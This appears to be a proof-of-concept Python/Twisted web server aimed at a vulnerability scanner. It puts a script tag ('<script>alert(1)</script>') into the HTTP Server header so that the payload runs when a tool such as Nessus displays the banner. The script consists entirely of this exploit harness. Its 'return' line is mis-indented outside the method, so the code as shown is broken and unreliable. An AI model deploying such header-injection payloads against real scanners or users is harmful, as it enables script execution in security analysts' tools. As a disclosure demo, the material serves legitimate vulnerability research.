#!/usr/bin/env python
import sys
from twisted.web import server, resource
from twisted.internet import reactor
from twisted.python import log

class Site(server.Site):
    def getResourceFor(self, request):
        request.setHeader('server', '<script>alert(1)</script>SomeServer')
        return server.Site.getResourceFor(self, request)

class HelloResource(resource.Resource):
    isLeaf = True
    numberRequests = 0

    def render_GET(self, request):
        self.numberRequests += 1
        request.setHeader("content-type", "text/plain")
return "theSecurityFactory Nessus POC"

log.startLogging(sys.stderr)
reactor.listenTCP(8080, Site(HelloResource()))
reactor.run()
